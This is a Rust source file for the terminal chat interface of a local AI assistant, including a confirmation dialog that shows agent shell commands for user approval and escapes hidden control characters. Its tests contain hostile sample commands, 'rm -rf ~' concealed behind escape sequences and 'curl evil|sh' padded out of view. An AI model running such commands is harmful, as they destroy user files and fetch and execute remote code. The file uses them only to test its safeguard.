//! ratatui render for the chat TUI. Mutates only layout outputs: the
//! output pane's wrap cache, the app's last viewport height, and how much
//! of the script the confirmation modal showed.

use std::time::{Duration, Instant};

use assistd_core::{PresenceState, VoiceCaptureState};
use assistd_tools::ConfirmationRequest;
use ratatui::Frame;
use ratatui::layout::{Constraint, Layout, Position, Rect};
use ratatui::style::{Color, Modifier, Style};
use ratatui::text::{Line, Span, Text};
use ratatui::widgets::{Block, Borders, Clear, Paragraph};
use ratatui_image::StatefulImage;
use textwrap::core::display_width;

use super::app::{
    App, BranchListEntry, BranchPickerModal, ConfirmOffer, ConfirmationModal, ScriptVisibility,
};
use super::output::{OutputPane, THUMBNAIL_ROWS, ThumbnailSlot};
use super::vram::{RamState, VramState};

const INPUT_PROMPT: &str = "> ";
const SLASH_POPUP_MAX_ROWS: u16 = 6;
/// Wrapped script rows shown in the confirmation modal before the rest is
/// summarised as a count.
const CONFIRM_SCRIPT_MAX_ROWS: usize = 12;
/// Confirmation modal rows outside its body: two borders and the footer.
const CONFIRM_FRAME_ROWS: usize = 3;
/// Rows of a thumbnail slot taken by its filename caption.
const THUMBNAIL_CAPTION_ROWS: u16 = 1;
const THUMBNAIL_MAX_COLS: u16 = 32;
const SESSION_TITLE_MAX_CHARS: usize = 32;

pub(super) fn render(frame: &mut Frame<'_>, app: &mut App) {
    let frame_area = frame.area();
    let input_height =
        compute_input_height(frame_area.width, frame_area.height, app.input.buffer());
    let suggestions = app.slash_suggestions();
    let popup_height = saturating_u16(suggestions.len()).min(SLASH_POPUP_MAX_ROWS);
    let [output_area, popup_area, status_area, input_area] = Layout::vertical([
        Constraint::Min(3),
        Constraint::Length(popup_height),
        Constraint::Length(1),
        Constraint::Length(input_height),
    ])
    .areas(frame_area);

    app.set_output_height(output_area.height);

    render_output(frame, output_area, app);
    if popup_height > 0 {
        render_slash_popup(frame, popup_area, &suggestions, app.slash_selected());
    }
    render_status(frame, status_area, app);
    render_input(frame, input_area, app);

    if let Some(picker) = &app.picker_modal {
        render_branch_picker_modal(frame, frame.area(), picker);
    }
    if let Some(modal) = app.modal.as_mut() {
        render_confirmation_modal(frame, frame.area(), modal);
    }
}

fn centered_rect(area: Rect, width: u16, height: u16) -> Rect {
    let width = width.min(area.width);
    let height = height.min(area.height);
    Rect {
        x: area.x + (area.width - width) / 2,
        y: area.y + (area.height - height) / 2,
        width,
        height,
    }
}

/// Clear `area`, draw a bordered block titled `title` in `color`, and
/// return its inner area.
fn render_modal_frame(
    frame: &mut Frame<'_>,
    area: Rect,
    title: &'static str,
    color: Color,
) -> Rect {
    frame.render_widget(Clear, area);
    let block = Block::default()
        .title(Span::styled(
            title,
            Style::default().fg(color).add_modifier(Modifier::BOLD),
        ))
        .borders(Borders::ALL)
        .border_style(Style::default().fg(color));
    let inner = block.inner(area);
    frame.render_widget(block, area);
    inner
}

fn render_branch_picker_modal(frame: &mut Frame<'_>, area: Rect, picker: &BranchPickerModal) {
    let width = (area.width.saturating_mul(4) / 5).clamp(50, 120);
    let height = saturating_u16(picker.entries.len())
        .saturating_add(4)
        .min(area.height.saturating_sub(2))
        .max(6);
    let inner = render_modal_frame(
        frame,
        centered_rect(area, width, height),
        " Resume conversation ",
        Color::Cyan,
    );

    let list_height = inner.height.saturating_sub(1);
    let list_area = Rect {
        height: list_height,
        ..inner
    };
    let footer_area = Rect {
        y: inner.y + list_height,
        height: 1,
        ..inner
    };

    let visible = usize::from(list_height);
    let start = picker_scroll_start(picker.selected, picker.entries.len(), visible);
    let lines: Vec<Line<'_>> = picker
        .entries
        .iter()
        .enumerate()
        .skip(start)
        .take(visible)
        .map(|(i, entry)| picker_row(entry, i == picker.selected))
        .collect();
    frame.render_widget(Paragraph::new(Text::from(lines)), list_area);

    let footer = Line::from(Span::styled(
        " ↑/↓ select · Enter resume · Esc cancel",
        Style::default().fg(Color::DarkGray),
    ));
    frame.render_widget(Paragraph::new(footer), footer_area);
}

/// First entry of a `visible`-row window that keeps `selected` in view.
fn picker_scroll_start(selected: usize, total: usize, visible: usize) -> usize {
    if total <= visible {
        return 0;
    }
    (selected + 1).saturating_sub(visible).min(total - visible)
}

fn picker_row(entry: &BranchListEntry, selected: bool) -> Line<'static> {
    let marker = if entry.is_active_session && entry.is_current_in_session {
        "●"
    } else {
        " "
    };
    let parent = match (entry.parent_branch_name.as_deref(), entry.fork_point_seq) {
        (Some(p), Some(seq)) => format!("  (forked from {p}@{seq})"),
        _ => String::new(),
    };
    let session_label = entry
        .session_title
        .as_deref()
        .filter(|t| !t.is_empty())
        .unwrap_or(entry.session_short.as_str());
    let row = format!(
        " {marker} [{session_label}] {}  · {} msgs{parent}",
        entry.name, entry.message_count
    );
    let style = if selected {
        selected_style()
    } else {
        Style::default()
    };
    Line::from(Span::styled(row, style))
}

fn render_slash_popup(
    frame: &mut Frame<'_>,
    area: Rect,
    suggestions: &[&'static (&'static str, &'static str)],
    selected: usize,
) {
    if area.width == 0 || area.height == 0 {
        return;
    }
    let lines: Vec<Line<'_>> = suggestions
        .iter()
        .enumerate()
        .take(area.height as usize)
        .map(|(i, (cmd, hint))| {
            let (style, hint_style) = if i == selected {
                (selected_style(), reversed_style())
            } else {
                (
                    Style::default().fg(Color::Cyan),
                    Style::default().fg(Color::DarkGray),
                )
            };
            if hint.is_empty() {
                Line::from(Span::styled(format!(" {cmd}"), style))
            } else {
                Line::from(vec![
                    Span::styled(format!(" {cmd} "), style),
                    Span::styled((*hint).to_string(), hint_style),
                ])
            }
        })
        .collect();
    frame.render_widget(Paragraph::new(Text::from(lines)), area);
}

/// The script hard-wrapped to `width` columns, at most `max_rows` rows
/// with the rest summarised as a count. Control characters other than
/// the newline are escaped so a script cannot hide a command behind a
/// carriage return or terminal escape.
fn script_rows(
    script: &str,
    width: usize,
    max_rows: usize,
) -> (Vec<Line<'static>>, ScriptVisibility) {
    let rows: Vec<String> = script
        .split('\n')
        .flat_map(|line| hard_wrap(&escape_controls(line), width))
        .collect();
    if rows.len() <= max_rows {
        let lines = rows.into_iter().map(Line::from).collect();
        return (lines, ScriptVisibility::Whole);
    }
    let shown = max_rows.saturating_sub(1);
    let mut out: Vec<Line<'static>> = rows[..shown].iter().cloned().map(Line::from).collect();
    out.push(Line::from(Span::styled(
        format!("… {} more row(s)", rows.len() - shown),
        Style::default().fg(Color::DarkGray),
    )));
    (out, ScriptVisibility::Partial)
}

/// `label` followed by `value` hard-wrapped to `width` columns, with
/// continuation rows indented under the value.
fn labelled_rows(label: &str, value: &str, value_style: Style, width: usize) -> Vec<Line<'static>> {
    let indent = display_width(label);
    let value_width = width.saturating_sub(indent).max(1);
    let label_style = Style::default().fg(Color::DarkGray);
    hard_wrap(&escape_controls(value), value_width)
        .into_iter()
        .enumerate()
        .map(|(i, chunk)| {
            let lead = if i == 0 {
                Span::styled(label.to_string(), label_style)
            } else {
                Span::raw(" ".repeat(indent))
            };
            Line::from(vec![lead, Span::styled(chunk, value_style)])
        })
        .collect()
}

/// Split `text` into rows of at most `width` display columns, breaking
/// anywhere so whitespace is kept verbatim. Always yields at least one row.
fn hard_wrap(text: &str, width: usize) -> Vec<String> {
    let width = width.max(1);
    let mut rows = Vec::new();
    let mut row = String::new();
    let mut row_width = 0;
    for c in text.chars() {
        let char_width = display_width(c.encode_utf8(&mut [0; 4]));
        if row_width + char_width > width && row_width > 0 {
            rows.push(std::mem::take(&mut row));
            row_width = 0;
        }
        row.push(c);
        row_width += char_width;
    }
    rows.push(row);
    rows
}

fn escape_controls(raw: &str) -> String {
    let mut out = String::with_capacity(raw.len());
    for c in raw.chars() {
        if c.is_control() {
            out.extend(c.escape_default());
        } else {
            out.push(c);
        }
    }
    out
}

/// The rows above the script: tool, reason, a gap, and the script label.
fn confirmation_header(request: &ConfirmationRequest, width: usize) -> Vec<Line<'static>> {
    let line_count = request.script.split('\n').count();
    let command_label = if line_count == 1 {
        "command:".to_string()
    } else {
        format!("command ({line_count} lines):")
    };
    let bold = Style::default().add_modifier(Modifier::BOLD);
    let mut header = labelled_rows("tool: ", &request.tool, bold, width);
    header.extend(labelled_rows(
        "reason: ",
        &request.matched_pattern,
        bold,
        width,
    ));
    header.push(Line::from(""));
    header.push(Line::from(Span::styled(
        command_label,
        Style::default().fg(Color::DarkGray),
    )));
    header
}

fn render_confirmation_modal(frame: &mut Frame<'_>, area: Rect, modal: &mut ConfirmationModal) {
    let width = (area.width.saturating_mul(3) / 5)
        .clamp(40, 100)
        .min(area.width);
    let text_width = usize::from(width.saturating_sub(2));
    let max_height = area.height.saturating_sub(2);
    let mut body = confirmation_header(&modal.request, text_width);
    let script_budget = usize::from(max_height)
        .saturating_sub(body.len() + CONFIRM_FRAME_ROWS)
        .min(CONFIRM_SCRIPT_MAX_ROWS);
    let (script, visibility) = script_rows(&modal.request.script, text_width, script_budget);
    body.extend(script);
    modal.record_script_visibility(visibility);
    let height = saturating_u16(body.len() + CONFIRM_FRAME_ROWS)
        .max(6)
        .min(max_height);
    let inner = render_modal_frame(
        frame,
        centered_rect(area, width, height),
        " Confirm command ",
        Color::Yellow,
    );
    let [body_area, footer_area] =
        Layout::vertical([Constraint::Min(1), Constraint::Length(1)]).areas(inner);
    frame.render_widget(Paragraph::new(Text::from(body)), body_area);

    let footer = Line::from(confirmation_footer(modal));
    frame.render_widget(Paragraph::new(footer), footer_area);
}

fn confirmation_footer(modal: &ConfirmationModal) -> Span<'static> {
    match modal.offer() {
        ConfirmOffer::ScriptHidden => Span::styled(
            "script too long to review here  [n]/Esc deny",
            Style::default().fg(Color::Red),
        ),
        ConfirmOffer::Arming => Span::styled(
            "read the command…   [n] / Esc cancel",
            Style::default().fg(Color::DarkGray),
        ),
        ConfirmOffer::Approval { always: false } => Span::styled(
            "[y] run it   [n] / Esc cancel",
            Style::default().fg(Color::Green),
        ),
        ConfirmOffer::Approval { always: true } => Span::styled(
            format!(
                "[y] run once   [a] always allow {}   [n] / Esc cancel",
                modal.request.always_allow.join(", ")
            ),
            Style::default().fg(Color::Green),
        ),
    }
}

fn render_output(frame: &mut Frame<'_>, area: Rect, app: &mut App) {
    if area.width == 0 || area.height == 0 {
        return;
    }

    let slots = app.output.thumbnail_layout(area.width);
    let (lines, viewport_top) = app.output.render_view(area.width, area.height);
    for (line, row) in lines.iter().zip(area.rows()) {
        frame.render_widget(line, row);
    }
    render_thumbnails(frame, area, &mut app.output, &slots, viewport_top);

    if app.generating {
        render_generating_row(frame, area, app.spinner_char());
    }
}

/// Draw each thumbnail whose image rows sit wholly inside the viewport
/// starting at wrapped row `viewport_top`.
fn render_thumbnails(
    frame: &mut Frame<'_>,
    area: Rect,
    output: &mut OutputPane,
    slots: &[ThumbnailSlot],
    viewport_top: usize,
) {
    let image_height = THUMBNAIL_ROWS.saturating_sub(THUMBNAIL_CAPTION_ROWS);
    let viewport_bottom = viewport_top.saturating_add(area.height as usize);
    for slot in slots {
        let image_start = slot.start_row + THUMBNAIL_CAPTION_ROWS as usize;
        let image_end = slot.start_row + slot.height;
        if image_start < viewport_top || image_end > viewport_bottom {
            continue;
        }
        let local_row = saturating_u16(image_start - viewport_top);
        if local_row >= area.height {
            continue;
        }
        let rect = Rect {
            x: area.x,
            y: area.y + local_row,
            width: area.width.min(THUMBNAIL_MAX_COLS),
            height: image_height.min(area.height - local_row),
        };
        if let Some(state) = output.thumbnail_protocol_mut(slot.item_idx) {
            frame.render_stateful_widget(StatefulImage::default(), rect, state);
        }
    }
}

fn render_generating_row(frame: &mut Frame<'_>, area: Rect, spinner: char) {
    let row = Rect {
        y: area.y + area.height.saturating_sub(1),
        height: 1,
        ..area
    };
    let para = Paragraph::new(Line::from(Span::styled(
        format!("{spinner} Generating…"),
        Style::default()
            .fg(Color::Gray)
            .add_modifier(Modifier::DIM)
            .add_modifier(Modifier::ITALIC),
    )));
    frame.render_widget(Clear, row);
    frame.render_widget(para, row);
}

/// Indicators on the left, and a notice or key hints right-aligned when
/// they fit.
fn render_status(frame: &mut Frame<'_>, area: Rect, app: &App) {
    if area.width == 0 {
        return;
    }
    let mut spans = status_indicators(app);
    let left_len: usize = spans.iter().map(|s| s.content.chars().count()).sum();
    let hint = status_hint(app);
    let hint_len = hint.chars().count();
    let width = area.width as usize;
    if left_len + hint_len < width {
        spans.push(Span::styled(
            " ".repeat(width - left_len - hint_len),
            reversed_style(),
        ));
        spans.push(Span::styled(
            hint,
            Style::default()
                .fg(Color::DarkGray)
                .add_modifier(Modifier::REVERSED),
        ));
    }
    frame.render_widget(Paragraph::new(Line::from(spans)), area);
}

fn status_indicators(app: &App) -> Vec<Span<'static>> {
    let reversed = reversed_style();
    let mut spans = Vec::new();
    if let Some(title) = app.session_title.as_deref() {
        spans.push(Span::styled(truncate_title(title), highlight_style()));
        spans.push(Span::styled(" │ ", reversed));
    }
    spans.push(Span::styled(format!("model: {}", app.model_name), reversed));
    if let Some((color, label)) = presence_dot(app.presence_state) {
        push_indicator(&mut spans, "●".to_string(), color, label);
    }
    if let Some(remaining) = app.local_time_until_next_transition() {
        spans.push(Span::styled(
            format!(" ({})", format_countdown(remaining)),
            reversed,
        ));
    }
    if let Some((color, label)) = voice_indicator(app.listening) {
        push_indicator(&mut spans, app.spinner_char().to_string(), color, label);
    }
    push_starting(&mut spans, app);
    push_toggle(&mut spans, "vision", app.vision_enabled);
    push_toggle(&mut spans, "verbose", app.verbose);
    let pending_count = app.pending_attachments.len();
    if pending_count > 0 {
        spans.push(Span::raw(" "));
        spans.push(Span::styled(
            format!("📎×{pending_count}"),
            highlight_style(),
        ));
    }
    if let Some(rate) = app.throughput.snapshot(Instant::now()).rate {
        spans.push(Span::styled(format!(" │ {rate:.0} tok/s"), reversed));
    }
    spans.push(Span::styled(
        format!(" │ RAM: {}", ram_label(&app.resources.ram)),
        reversed,
    ));
    spans.push(Span::styled(
        format!(" │ VRAM: {}", vram_label(&app.resources.vram)),
        reversed,
    ));
    spans
}

fn push_indicator(spans: &mut Vec<Span<'static>>, glyph: String, color: Color, label: &str) {
    spans.push(Span::raw(" "));
    spans.push(Span::styled(
        glyph,
        Style::default().fg(color).add_modifier(Modifier::BOLD),
    ));
    spans.push(Span::styled(format!(" {label}"), reversed_style()));
}

fn push_starting(spans: &mut Vec<Span<'static>>, app: &App) {
    let starting: Vec<String> = app.startup.starting().map(ToString::to_string).collect();
    if starting.is_empty() {
        return;
    }
    spans.push(Span::styled(" │ ", reversed_style()));
    spans.push(Span::styled(
        format!("starting: {}", starting.join(", ")),
        Style::default()
            .fg(Color::Yellow)
            .add_modifier(Modifier::REVERSED),
    ));
}

fn push_toggle(spans: &mut Vec<Span<'static>>, name: &str, on: bool) {
    let (state, color) = if on {
        ("on", Color::Green)
    } else {
        ("off", Color::DarkGray)
    };
    spans.push(Span::styled(" │ ", reversed_style()));
    spans.push(Span::styled(
        format!("{name}: {state}"),
        Style::default().fg(color).add_modifier(Modifier::REVERSED),
    ));
}

fn status_hint(app: &App) -> String {
    if let Some(notice) = app.notice() {
        notice.to_string()
    } else if app.output.scroll_offset() > 0 {
        format!(
            "↑{} · PgDn to follow · Ctrl+C quit",
            app.output.scroll_offset()
        )
    } else if app.presence_state.is_some() {
        "Ctrl+C quit · F2 cycle presence · PgUp/Dn scroll".to_string()
    } else {
        "Ctrl+C quit · PgUp/Dn scroll · ↑/↓ history".to_string()
    }
}

fn vram_label(state: &VramState) -> String {
    match state {
        VramState::Unknown => "…".to_string(),
        VramState::Disabled => "N/A".to_string(),
        VramState::Ok(info) => gib_label(info.used_mb, info.total_mb),
        VramState::Err(_) => "err".to_string(),
    }
}

fn ram_label(state: &RamState) -> String {
    match state {
        RamState::Unknown => "…".to_string(),
        RamState::Ok(info) => gib_label(info.used_mb, info.total_mb),
    }
}

fn gib_label(used_mb: u64, total_mb: u64) -> String {
    format!(
        "{:.1}/{:.1} GiB",
        used_mb as f64 / 1024.0,
        total_mb as f64 / 1024.0,
    )
}

fn reversed_style() -> Style {
    Style::default().add_modifier(Modifier::REVERSED)
}

fn selected_style() -> Style {
    Style::default()
        .add_modifier(Modifier::REVERSED)
        .add_modifier(Modifier::BOLD)
}

fn highlight_style() -> Style {
    Style::default()
        .fg(Color::Cyan)
        .add_modifier(Modifier::BOLD)
        .add_modifier(Modifier::REVERSED)
}

fn truncate_title(title: &str) -> String {
    if title.chars().count() <= SESSION_TITLE_MAX_CHARS {
        return title.to_string();
    }
    let head: String = title.chars().take(SESSION_TITLE_MAX_CHARS - 1).collect();
    format!("{}…", head.trim_end())
}

fn presence_dot(s: Option<PresenceState>) -> Option<(Color, &'static str)> {
    match s? {
        PresenceState::Active => Some((Color::Green, "active")),
        PresenceState::Drowsy => Some((Color::Yellow, "drowsy")),
        PresenceState::Sleeping => Some((Color::Red, "sleeping")),
        PresenceState::Waking => Some((Color::Blue, "waking")),
    }
}

fn voice_indicator(s: VoiceCaptureState) -> Option<(Color, &'static str)> {
    match s {
        VoiceCaptureState::Idle => None,
        VoiceCaptureState::Recording => Some((Color::Red, "Listening…")),
        VoiceCaptureState::Queued => Some((Color::Blue, "Processing…")),
        VoiceCaptureState::Transcribing => Some((Color::Yellow, "transcribing…")),
    }
}

fn format_countdown(d: Duration) -> String {
    let total = d.as_secs();
    if total >= 3600 {
        format!("{}h{:02}m", total / 3600, (total % 3600) / 60)
    } else if total >= 60 {
        format!("{}m", total / 60)
    } else {
        format!("{total}s")
    }
}

fn render_input(frame: &mut Frame<'_>, area: Rect, app: &App) {
    if area.width == 0 || area.height == 0 {
        return;
    }
    let prompt_w = saturating_u16(INPUT_PROMPT.chars().count());
    let buf_chars: Vec<char> = app.input.buffer().chars().collect();
    let rows = wrap_input(&buf_chars, prompt_w, area.width);

    let lines: Vec<Line<'_>> = rows
        .iter()
        .enumerate()
        .map(|(i, &(start, end))| {
            let mut row = String::new();
            if i == 0 {
                row.push_str(INPUT_PROMPT);
            }
            row.extend(&buf_chars[start..end]);
            Line::from(row)
        })
        .collect();
    frame.render_widget(Paragraph::new(Text::from(lines)), area);

    let (row_idx, col) = locate_cursor(&rows, app.input.cursor_col() as usize);
    let mut cursor_x = saturating_u16(col);
    if row_idx == 0 {
        cursor_x = cursor_x.saturating_add(prompt_w);
    }
    let cy = area
        .y
        .saturating_add(saturating_u16(row_idx))
        .min(area.y + area.height.saturating_sub(1));
    let cx = (area.x + cursor_x).min(area.x + area.width.saturating_sub(1));
    frame.set_cursor_position(Position::new(cx, cy));
}

fn compute_input_height(frame_width: u16, frame_height: u16, buffer: &str) -> u16 {
    if frame_width == 0 {
        return 1;
    }
    let prompt_w = saturating_u16(INPUT_PROMPT.chars().count());
    let chars: Vec<char> = buffer.chars().collect();
    let needed = saturating_u16(wrap_input(&chars, prompt_w, frame_width).len());
    let cap = frame_height.saturating_sub(4).max(1);
    needed.clamp(1, cap)
}

/// `(start, end)` char ranges of each input row, breaking after the last
/// whitespace that fits. A row that fills the width is followed by an
/// empty one for the cursor.
fn wrap_input(buf: &[char], prompt_w: u16, width: u16) -> Vec<(usize, usize)> {
    let n = buf.len();
    if width == 0 {
        return vec![(0, n)];
    }
    let mut rows: Vec<(usize, usize)> = Vec::new();
    let mut start = 0usize;
    while start < n {
        let cap = if rows.is_empty() {
            (width as usize).saturating_sub(prompt_w as usize).max(1)
        } else {
            width as usize
        };
        if n - start <= cap {
            rows.push((start, n));
            break;
        }
        let end_max = start + cap;
        let row_end = buf[start..end_max]
            .iter()
            .rposition(|c| c.is_whitespace())
            .map_or(end_max, |i| start + i + 1);
        rows.push((start, row_end));
        start = row_end;
    }
    if rows.is_empty() {
        rows.push((0, 0));
    }
    let (ls, le) = *rows.last().expect("rows non-empty");
    let last_visible = (le - ls)
        + if rows.len() == 1 {
            prompt_w as usize
        } else {
            0
        };
    if last_visible >= width as usize {
        rows.push((n, n));
    }
    rows
}

fn locate_cursor(rows: &[(usize, usize)], cursor: usize) -> (usize, usize) {
    for (idx, &(s, e)) in rows.iter().enumerate() {
        if cursor < e {
            return (idx, cursor - s);
        }
        if cursor == e {
            if idx + 1 < rows.len() {
                return (idx + 1, 0);
            }
            return (idx, cursor - s);
        }
    }
    let last = rows.len().saturating_sub(1);
    let (s, e) = rows.get(last).copied().unwrap_or((0, 0));
    (last, cursor.saturating_sub(s).min(e - s))
}

fn saturating_u16(value: usize) -> u16 {
    u16::try_from(value).unwrap_or(u16::MAX)
}

#[cfg(test)]
mod tests {
    use ratatui::Terminal;
    use ratatui::backend::TestBackend;

    use super::*;

    fn line_text(line: &Line<'_>) -> String {
        line.spans.iter().map(|s| s.content.as_ref()).collect()
    }

    #[test]
    fn branch_picker_clamps_to_a_pane_narrower_than_its_floor() {
        let picker = BranchPickerModal {
            entries: Vec::new(),
            selected: 0,
        };
        let mut terminal = Terminal::new(TestBackend::new(20, 4)).expect("test terminal");
        terminal
            .draw(|frame| render_branch_picker_modal(frame, frame.area(), &picker))
            .expect("draw");
        let buffer = terminal.backend().buffer();
        assert_eq!(buffer[(0, 0)].symbol(), "┌");
        assert_eq!(buffer[(19, 3)].symbol(), "┘");
    }

    fn confirmation_modal(tool: &str, script: &str) -> ConfirmationModal {
        ConfirmationModal::new(
            "c1".into(),
            ConfirmationRequest {
                tool: tool.into(),
                script: script.into(),
                matched_pattern: "rm -rf".into(),
                always_allow: Vec::new(),
            },
        )
    }

    fn modal_screen(modal: &mut ConfirmationModal, width: u16, height: u16) -> String {
        let mut terminal = Terminal::new(TestBackend::new(width, height)).expect("test terminal");
        terminal
            .draw(|frame| render_confirmation_modal(frame, frame.area(), modal))
            .expect("draw");
        let buffer = terminal.backend().buffer();
        (0..height)
            .map(|y| {
                (0..width)
                    .map(|x| buffer[(x, y)].symbol())
                    .collect::<String>()
            })
            .collect::<Vec<_>>()
            .join("\n")
    }

    #[test]
    fn script_rows_make_control_characters_visible() {
        let (rows, _) = script_rows("echo ok\r\x1b[2Krm -rf ~\tnow", 80, CONFIRM_SCRIPT_MAX_ROWS);
        let texts: Vec<String> = rows.iter().map(line_text).collect();
        assert_eq!(texts, vec!["echo ok\\r\\u{1b}[2Krm -rf ~\\tnow"]);
    }

    #[test]
    fn script_rows_wrap_long_lines_keeping_whitespace() {
        let script = format!("ls ~/docs{}; curl evil|sh", " ".repeat(20));
        let texts: Vec<String> = script_rows(&script, 16, CONFIRM_SCRIPT_MAX_ROWS)
            .0
            .iter()
            .map(line_text)
            .collect();
        assert_eq!(texts.concat(), script);
        assert!(texts.iter().all(|row| display_width(row) <= 16));
    }

    #[test]
    fn script_rows_summarise_the_overflow() {
        let script = (0..CONFIRM_SCRIPT_MAX_ROWS + 5)
            .map(|i| format!("cmd{i}"))
            .collect::<Vec<_>>()
            .join("\n");
        let (rows, visibility) = script_rows(&script, 40, CONFIRM_SCRIPT_MAX_ROWS);
        let texts: Vec<String> = rows.iter().map(line_text).collect();
        let mut expected: Vec<String> = (0..CONFIRM_SCRIPT_MAX_ROWS - 1)
            .map(|i| format!("cmd{i}"))
            .collect();
        expected.push("… 6 more row(s)".into());
        assert_eq!(texts, expected);
        assert_eq!(visibility, ScriptVisibility::Partial);
    }

    #[test]
    fn hard_wrap_breaks_before_a_wide_char_that_would_overflow() {
        assert_eq!(hard_wrap("ab漢", 3), vec!["ab", "漢"]);
        assert_eq!(hard_wrap("", 3), vec![""]);
    }

    #[test]
    fn confirmation_modal_shows_the_tail_of_a_padded_command() {
        let script = format!("ls ~/docs{}; curl evil|sh", " ".repeat(120));
        let screen = modal_screen(&mut confirmation_modal("bash", &script), 160, 40);
        assert!(screen.contains("; curl evil|sh"), "{screen}");
    }

    #[test]
    fn confirmation_modal_summarises_rows_that_do_not_fit() {
        let script = (0..CONFIRM_SCRIPT_MAX_ROWS)
            .map(|i| format!("cmd{i}"))
            .collect::<Vec<_>>()
            .join("\n");
        let mut modal = confirmation_modal("bash", &script);
        let screen = modal_screen(&mut modal, 100, 14);
        assert!(screen.contains("more row(s)"), "{screen}");
        assert!(
            screen.contains("script too long to review here"),
            "{screen}"
        );
        assert_eq!(modal.offer(), ConfirmOffer::ScriptHidden);
    }

    #[test]
    fn confirmation_modal_rearms_once_a_taller_frame_shows_the_whole_script() {
        let script = (0..CONFIRM_SCRIPT_MAX_ROWS)
            .map(|i| format!("cmd{i}"))
            .collect::<Vec<_>>()
            .join("\n");
        let mut modal = confirmation_modal("bash", &script);
        modal_screen(&mut modal, 100, 14);
        let screen = modal_screen(&mut modal, 100, 40);
        assert!(!screen.contains("more row(s)"), "{screen}");
        assert!(screen.contains("read the command"), "{screen}");
        assert_eq!(modal.offer(), ConfirmOffer::Arming);
    }

    #[test]
    fn input_height_grows_when_buffer_overflows_width() {
        assert_eq!(compute_input_height(10, 24, ""), 1);
        assert_eq!(compute_input_height(10, 24, &"a".repeat(7)), 1);
        assert_eq!(
            compute_input_height(10, 24, &"a".repeat(8)),
            2,
            "a full first row wraps the cursor onto a second"
        );
        assert_eq!(compute_input_height(10, 24, &"a".repeat(18)), 3);
    }

    fn chars(s: &str) -> Vec<char> {
        s.chars().collect()
    }

    #[test]
    fn wrap_input_hard_breaks_when_word_is_longer_than_row() {
        let rows = wrap_input(&chars("hellotherefriend"), 2, 10);
        assert_eq!(rows, vec![(0, 8), (8, 16)]);
    }

    #[test]
    fn locate_cursor_jumps_to_next_row_on_boundary() {
        let buf = chars("hello world");
        let rows = wrap_input(&buf, 2, 10);
        assert_eq!(rows, [(0, 6), (6, 11)]);
        assert_eq!(locate_cursor(&rows, 0), (0, 0));
        assert_eq!(locate_cursor(&rows, 5), (0, 5));
        assert_eq!(locate_cursor(&rows, 6), (1, 0));
        assert_eq!(locate_cursor(&rows, 11), (1, 5));
    }

    #[test]
    fn locate_cursor_lands_on_phantom_row_after_full_row() {
        let buf = chars("aaaaaaaa");
        let rows = wrap_input(&buf, 2, 10);
        assert_eq!(locate_cursor(&rows, 8), (1, 0));
    }
}
